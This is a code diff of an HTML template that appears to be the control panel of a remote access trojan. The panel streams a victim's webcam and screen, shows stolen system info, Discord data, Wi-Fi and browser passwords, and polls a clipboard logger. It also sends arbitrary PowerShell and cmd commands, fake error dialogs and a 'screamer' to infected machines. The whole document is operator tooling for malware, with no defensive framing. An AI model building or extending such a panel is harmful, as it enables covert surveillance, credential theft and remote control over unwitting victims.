@@ -1,282 +1,371 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Client {{ clientId }}</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <title>Client {{ clientId }}</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
     <style>
-        .square-form {
-            width: 300px;
-            height: 300px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            margin-right: 0;
-            margin-top: 20px; /* Отступ сверху */
+        body {
+            background-color: #1a1a1a;
+            color: #ffffff;
         }
         .container {
-            margin-left: 0px;
-            padding-left: 0px;
+            max-width: 1200px;
+            margin-top: 20px;
         }
-        .square-form input {
-            margin-bottom: 10px;
+        .nav-tabs .nav-link {
+            color: #ffffff;
         }
-        .square-form button {
-            margin-top: 10px;
+        .nav-tabs .nav-link.active {
+            background-color: #2a2a2a;
+            color: #ffffff;
+            border-color: #ffffff;
         }
-        .form-header {
-            text-align: center;
+        .tab-content {
+            background-color: #2a2a2a;
+            padding: 20px;
+            border-radius: 0 0 5px 5px;
+        }
+        .form-check-input:checked {
+            background-color: #0d6efd;
+            border-color: #0d6efd;
+        }
+        .square-form {
+            background-color: #2a2a2a;
+            border: 1px solid #ffffff;
+            border-radius: 5px;
+            padding: 20px;
             margin-bottom: 20px;
-            font-weight: bold;
-            font-size: 1.25rem;
+        }
+        .fullscreen-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            z-index: 1000;
         }
     </style>
 </head>
 <body>
-    <a href="/">
-        <button class="btn btn-secondary btn-lg">Back</button>
-    </a>
-    <br><br>
+    <div class="container">
+        <a href="/" class="btn btn-outline-light mb-3">Back</a>
 
-    <ul class="nav nav-tabs" id="myTab" role="tablist">
-        <li class="nav-item" role="presentation">
-            <button class="nav-link active" id="screen-tab" data-bs-toggle="tab" data-bs-target="#screen" type="button" role="tab" aria-controls="screen" aria-selected="true">screen and camera</button>
-        </li>
-        <li class="nav-item" role="presentation">
-            <button class="nav-link" id="stealer-tab" data-bs-toggle="tab" data-bs-target="#stealer" type="button" role="tab" aria-controls="stealer" aria-selected="false">stealer</button>
-        </li>
-        <li class="nav-item" role="presentation">
-            <button class="nav-link" id="loggers-tab" data-bs-toggle="tab" data-bs-target="#loggers" type="button" role="tab" aria-controls="loggers" aria-selected="false">loggers</button>
-        </li>
-        <li class="nav-item" role="presentation">
-            <button class="nav-link" id="console-tab" data-bs-toggle="tab" data-bs-target="#console" type="button" role="tab" aria-controls="console" aria-selected="false">console</button>
-        </li>
-        <li class="nav-item" role="presentation">
-            <button class="nav-link" id="test2-tab" data-bs-toggle="tab" data-bs-target="#test2" type="button" role="tab" aria-controls="test2" aria-selected="false">test2</button>
-        </li>
+        <ul class="nav nav-tabs" id="myTab" role="tablist">
+            <li class="nav-item" role="presentation">
+                <button class="nav-link active" id="screen-tab" data-bs-toggle="tab" data-bs-target="#screen" type="button" role="tab"><i class="fas fa-desktop"></i> Screen and Camera</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="stealer-tab" data-bs-toggle="tab" data-bs-target="#stealer" type="button" role="tab"><i class="fas fa-user-secret"></i> Stealer</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="loggers-tab" data-bs-toggle="tab" data-bs-target="#loggers" type="button" role="tab"><i class="fas fa-clipboard-list"></i> Loggers</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="console-tab" data-bs-toggle="tab" data-bs-target="#console" type="button" role="tab"><i class="fas fa-terminal"></i> Console</button>
+            </li>
+        </ul>
 
-    </ul>
-    <div class="tab-content" id="myTabContent">
-        <div class="tab-pane fade show active" id="screen" role="tabpanel" aria-labelledby="screen-tab">
-            <div class="form-check form-switch mb-3">
-                <input class="form-check-input" type="checkbox" role="switch" id="enableCamera">
-                <label class="form-check-label" for="enableCamera">Enable camera</label>
+        <div class="tab-content" id="myTabContent">
+            <div class="tab-pane fade show active" id="screen" role="tabpanel">
+                <div class="form-check form-switch mb-3">
+                    <input class="form-check-input" type="checkbox" id="enableCamera" onchange="toggleCamera(this)">
+                    <label class="form-check-label" for="enableCamera">Enable camera</label>
+                </div>
+
+                <div id="cameraWindow" class="mb-3 position-relative" style="display: none;">
+                    <button class="btn btn-sm btn-outline-light fullscreen-btn" onclick="toggleFullscreen('camera-feed')">Fullscreen</button>
+                    <img id="camera-feed" src="/get_camera_frame?id={{ clientId }}" alt="Video Feed" class="img-fluid">
+                </div>
+
+                <div class="form-check form-switch mb-3">
+                    <input class="form-check-input" type="checkbox" id="enableScreen" onchange="toggleScreen(this)">
+                    <label class="form-check-label" for="enableScreen">Enable screen</label>
+                </div>
+
+                <div id="screenWindow" class="mb-3 position-relative" style="display: none;">
+                    <button class="btn btn-sm btn-outline-light fullscreen-btn" onclick="toggleFullscreen('screen-feed')">Fullscreen</button>
+                    <img id="screen-feed" src="/get_screen_frame?id={{ clientId }}" alt="Screen Feed" class="img-fluid">
+                </div>
             </div>
-
-            <div id="cameraWindow" class="mb-3" style="display: none;">
-                <img id="camera-feed" src="/get_camera_frame?id={{ clientId }}" alt="Video Feed" class="img-fluid">
-                <!-- Поле ввода для скорости обновления -->
-                <label for="update-interval" class="form-label mt-2">Скорость обновления (в миллисекундах):</label>
-                <input type="number" id="update-interval" class="form-control" value="1000">
-            </div>
-
-            <div class="form-check form-switch mb-3">
-                <input class="form-check-input" type="checkbox" role="switch" id="enableScreen">
-                <label class="form-check-label" for="enableScreen">Enable screen</label>
-            </div>
-
-            <div id="screenWindow" class="mb-3" style="display: none;">
-                <img id="screen-feed" src="/get_screen_frame?id={{ clientId }}" alt="Screen Feed" class="img-fluid" style="max-width: 1000px;">
-                <!-- Поле ввода для скорости обновления экрана -->
-                <label for="screen-update-interval" class="form-label mt-2">Скорость обновления (в миллисекундах):</label>
-                <input type="number" id="screen-update-interval" class="form-control" value="1000">
-            </div>
-        </div>
-        <div class="tab-pane fade" id="stealer" role="tabpanel" aria-labelledby="stealer-tab">
-            <h1 class="text-center">Stealer:</h1>
-            <div class="container-fluid">
-                <div class="row">
-                    <div class="mw-50 col border border-2 border-black">
-                        <h2>Pc information:</h2>
-                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#systemContent" aria-expanded="false" aria-controls="systemContent">
-                            Toggle
-                        </button>
-                        <div class="collapse mt-2" id="systemContent">
-                            <h4>{{ systeminfo | safe }}</h4>
-                        </div>
-
-                    </div>
-                    <div class="mw-50 col border border-2 border-black">
-                        <h2>Discord:</h2>
-                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#discordContent" aria-expanded="false" aria-controls="discordContent">
-                            Toggle
-                        </button>
-                        <div class="collapse mt-2" id="discordContent">
-                            <h4>{{ Discordinfo | safe }}</h4>
-                        </div>
-                        <h2>Wifi passwords:</h2>
-                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#wifiContent" aria-expanded="false" aria-controls="wifiContent">
-                            Toggle
-                        </button>
-                        <div class="collapse mt-2" id="wifiContent">
-                            <h4>SSID: | Password:</h4>
-                            <h5>{{ Wifis | safe }}</h5>
-                        </div>
-                        <h3>Passwords:</h3>
-                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#passwordsContent" aria-expanded="false" aria-controls="passwordsContent">
-                            Toggle
-                        </button>
-                        <div class="collapse mt-2" id="passwordsContent">
-                            <h5>{{ browserPasswords | safe }}</h5>
+            <div class="tab-pane fade" id="stealer" role="tabpanel" aria-labelledby="stealer-tab">
+                <h1 class="text-center">Stealer:</h1>
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="col border border-2 border-black">
+                            <h2>Pc information:</h2>
+                            <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#systemContent" aria-expanded="false" aria-controls="systemContent">
+                                Toggle
+                            </button>
+                            <div class="collapse mt-2" id="systemContent">
+                                <h4>{{ systeminfo | safe }}</h4>
+                            </div>
+                            <h2>Discord:</h2>
+                            <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#discordContent" aria-expanded="false" aria-controls="discordContent">
+                                Toggle
+                            </button>
+                            <div class="collapse mt-2" id="discordContent">
+                                <h4>{{ Discordinfo | safe }}</h4>
+                            </div>
+                            <h2>Wifi passwords:</h2>
+                            <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#wifiContent" aria-expanded="false" aria-controls="wifiContent">
+                                Toggle
+                            </button>
+                            <div class="collapse mt-2" id="wifiContent">
+                                <h4>SSID: | Password:</h4>
+                                <h5>{{ Wifis | safe }}</h5>
+                            </div>
+                            <h3>Passwords:</h3>
+                            <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#passwordsContent" aria-expanded="false" aria-controls="passwordsContent">
+                                Toggle
+                            </button>
+                            <div class="collapse mt-2" id="passwordsContent">
+                                <h5>{{ browserPasswords | safe }}</h5>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
-        </div>
-        <div class="tab-pane fade" id="loggers" role="tabpanel" aria-labelledby="loggers-tab">
-            <h1 class="text-center">Loggers:</h1>
-            <div class="container-fluid">
-                <div class="row">
-                    <div class="col border border-2 border-black">
-                        <h2>ClipboardLogger:</h2>
-                        <h3 id="clipboard"></h3>
-                    </div>
-                    <div class="col border border-2 border-black">
-                        <h2>KeyLogger:</h2>
-                        <h3>Not working</h3>
+            <div class="tab-pane fade" id="loggers" role="tabpanel" aria-labelledby="loggers-tab">
+                <h1 class="text-center">Loggers:</h1>
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="col border border-2 border-black">
+                            <h2>ClipboardLogger:</h2>
+                            <h3 id="clipboard"></h3>
+                        </div>
+                        <div class="col border border-2 border-black">
+                            <h2>KeyLogger:</h2>
+                            <h3>Not working</h3>
+                        </div>
                     </div>
                 </div>
             </div>
-        </div>
-        <div class="tab-pane fade" id="console" role="tabpanel" aria-labelledby="console-tab">
-            <div class="container">
-                <div class="d-flex">
-                    <form class="square-form" id="errorForm">
-                        <div class="form-header">Send error</div>
-                        <div class="mb-3 w-100">
-                            <label for="errorName" class="form-label">Error name</label>
-                            <input type="text" class="form-control" id="errorName">
-                        </div>
-                        <div class="mb-3 w-100">
-                            <label for="errorDescription" class="form-label">Error description</label>
-                            <input type="text" class="form-control" id="errorDescription">
-                        </div>
-                        <button type="submit" class="btn btn-primary">Send</button>
-                    </form>
-                    <form class="square-form">
-                        <div class="form-header">Send powershell command</div>
-                        <div class="mb-3 w-100">
-                            <label for="powershellCommand" class="form-label">command</label>
-                            <input type="text" class="form-control" id="powershellCommand">
-                        </div>
-                        <button type="button" class="btn btn-primary" onclick="handleSubmit()">send</button>
-                    </form>
+            <div class="tab-pane fade" id="console" role="tabpanel" aria-labelledby="console-tab">
+                <h1 class="text-center">Console:</h1>
+                <div class="container">
+                    <div class="d-flex">
+                        <form class="square-form">
+                            <div class="form-header">Send error</div>
+                            <div class="mb-3 w-100">
+                                <label for="errorName">Error name</label>
+                                <input type="text" id="errorName">
+                            </div>
+                            <div class="mb-3 w-100">
+                                <label for="errorDescription">Error description</label>
+                                <input type="text" id="errorDescription">
+                            </div>
+                            <button type="submit" class="btn btn-primary" onclick="sendError()">Send</button>
+                        </form>
+                        <form class="square-form">
+                            <div class="form-header">Send powershell command</div>
+                            <div class="mb-3 w-100">
+                                <label for="powershellCommand">command</label>
+                                <label for="powershellCommand">command</label>
+                                <input type="text" id="powershellCommand">
+                            </div>
+                            <button type="button" class="btn btn-primary" onclick="sendPowershell()">send</button>
+                        </form>
+                        <form class="square-form">
+                            <div class="form-header">Send cmd command</div>
+                            <div class="mb-3 w-100">
+                                <label for="cmdCommand">command</label>
+                                <input type="text" id="cmdCommand">
+                            </div>
+                            <button type="button" class="btn btn-primary" onclick="sendCmd()">send</button>
+                        </form>
+                        <form class="square-form">
+                            <div class="form-header">Send screamer</div>
+                            <div class="mb-3 w-100">
+                                <label for="screamerDuration">duration</label>
+                                <input type="text" id="screamerDuration">
+                            </div>
+                            <button type="button" class="btn btn-primary" onclick="sendScreamer()">send</button>
+                        </form>
+                    </div>
                 </div>
+
+                <form id="myForm" onsubmit="sendConsole(event)">
+                    <input type="text" name="user_input" placeholder="Введите текст">
+                    <button type="submit">Отправить</button>
+                </form>
             </div>
-
-            <h1 class="text-center">Console:</h1>
-            <form id="myForm" onsubmit="sendConsole(event)">
-                <input type="text" name="user_input" placeholder="Введите текст">
-                <button type="submit">Отправить</button>
-            </form>
+            <div class="tab-pane fade" id="test2" role="tabpanel" aria-labelledby="test2-tab">
+                <h1 class="text-center">Hueta:</h1>
+            </div>
         </div>
-        <div class="tab-pane fade" id="test2" role="tabpanel" aria-labelledby="test2-tab">
-            <h1 class="text-center">Hueta:</h1>
-        </div>
-
     </div>
 
-
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
     <script>
+        let enableCamera;
+        let enableScreen;
+        enableCamera = false;
+        enableScreen = false;
+
+        const clientId = "{{ clientId }}";
+
         function autoRefresh() {
             const img = document.getElementById('camera-feed');
-            const intervalInput = document.getElementById('update-interval');
-            const enableCamera = document.getElementById('enableCamera').checked;
-
-            const updateInterval = parseInt(intervalInput.value);
-
-            if (enableCamera) {
+            if (enableCamera == true) {
                 img.src = "/get_camera_frame?id={{ clientId }}";
             }
 
-            setTimeout(autoRefresh, updateInterval);
+            setTimeout(autoRefresh, 1000);
+        }
+        autoRefresh();
+
+        function toggleCamera(element) {
+            enableCamera = !enableCamera;
+
+            let window = document.getElementById("cameraWindow");
+            if (enableCamera) {
+                window.style.display = 'block';
+            } else {
+                window.style.display = 'none';
+            }
+
+            let data = {
+                clientId: clientId,
+                state: +enableCamera
+            };
+
+            fetch("/toggle_camera", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
         }
 
         function screenAutoRefresh() {
-            const screenImg = document.getElementById('screen-feed');
-            const screenIntervalInput = document.getElementById('screen-update-interval');
-            const enableScreen = document.getElementById('enableScreen').checked;
+            const screenimg = document.getElementById('screen-feed');
+            if (enableScreen == true) {
+                screenimg.src = "/get_screen_frame?id={{ clientId }}";
+            }
 
-            const screenUpdateInterval = parseInt(screenIntervalInput.value);
+            setTimeout(screenAutoRefresh, 1000);
+        }
+        screenAutoRefresh();
 
+        function toggleScreen(element) {
+            enableScreen = !enableScreen;
+
+            let window = document.getElementById("screenWindow");
             if (enableScreen) {
-                screenImg.src = "/get_screen_frame?id={{ clientId }}";
+                window.style.display = 'block';
+            } else {
+                window.style.display = 'none';
             }
 
-            setTimeout(screenAutoRefresh, screenUpdateInterval);
-        }
+            let data = {
+                clientId: clientId,
+                state: +enableScreen
+            };
 
-        function sendPostRequest(url, data) {
-            data.clientId = "{{ clientId }}";
-
-            fetch(url, {
+            fetch("/toggle_screen", {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).then(response => response.json())
-              .then(data => console.log('Success:', data))
-              .catch((error) => console.error('Error:', error));
+            });
         }
 
-        document.getElementById('enableCamera').addEventListener('change', function() {
-            const cameraWindow = document.getElementById('cameraWindow');
-            const state = this.checked ? 1 : 0;
-            sendPostRequest('/toggle_camera', { state: state });
-
-            if (this.checked) {
-                cameraWindow.style.display = 'block';
-                autoRefresh(); // Запускаем обновление при включении
+        function toggleFullscreen(elementId) {
+            let element = document.getElementById(elementId);
+            if (!document.fullscreenElement) {
+                if (element.requestFullscreen) {
+                    element.requestFullscreen();
+                }
             } else {
-                cameraWindow.style.display = 'none';
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                }
             }
-        });
+        }
 
-        document.getElementById('enableScreen').addEventListener('change', function() {
-            const screenWindow = document.getElementById('screenWindow');
-            const state = this.checked ? 1 : 0;
-            sendPostRequest('/toggle_screen', { state: state });
+        function clipboardAutoRefresh() {
+            const h3Element = document.getElementById('clipboard');
+            fetch('/get_clipboard?id={{ clientId }}')
+                .then(response => {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                        return response.text();
+                    })
+                    .then(newText => {
+                        const containsHTML = newText.includes('<');
+                        if (containsHTML) h3Element.innerHTML = newText;
+                        else h3Element.textContent = newText;
+                    })
+                    .catch(error => {
+                        console.error('Problem with fetch operation:', error);
+                    });
 
-            if (this.checked) {
-                screenWindow.style.display = 'block';
-                screenAutoRefresh(); // Запускаем обновление при включении
-            } else {
-                screenWindow.style.display = 'none';
-            }
-        });
+            setTimeout(clipboardAutoRefresh, 5000);
+        }
 
-        document.getElementById('errorForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the form from submitting normally
+        clipboardAutoRefresh();
 
-            // Get values from the form
-            const errorName = document.getElementById('errorName').value;
-            const errorDescription = document.getElementById('errorDescription').value;
+        function sendError() {
+            let errorName = document.getElementById('errorName').value;
+            let errorDescription = document.getElementById('errorDescription').value;
 
-            // Create data object to send
-            const data = {
+            let data = {
+                clientId: clientId,
                 command: "error",
                 ErrorName: errorName,
                 ErrorText: errorDescription
             };
 
-            // URL to send the data
-            const url = '/send_console';
+            fetch("/send_console", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
+        function sendPowershell() {
+            let powershellCommand = document.getElementById('powershellCommand').value;
 
-            // Call the function to send the POST request
-            sendPostRequest(url, data);
-        });
+            let data = {
+                clientId: clientId,
+                command: "powershell",
+                text: powershellCommand
+            };
 
-        // Запуск начального состояния автообновления
-        autoRefresh();
-        screenAutoRefresh();
+            fetch("/send_console", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
+
+        function sendCmd() {
+            let cmdCommand = document.getElementById('cmdCommand').value;
+
+            let data = {
+                clientId: clientId,
+                command: "cmd",
+                text: cmdCommand
+            };
+
+            fetch("/send_console", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
+        function sendScreamer() {
+            let duration = document.getElementById('screamerDuration').value;
+
+            let data = {
+                clientId: clientId,
+                command: "screamer",
+                text: duration
+            };
+
+            fetch("/send_console", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }sendScreamer
     </script>
 </body>
 </html>
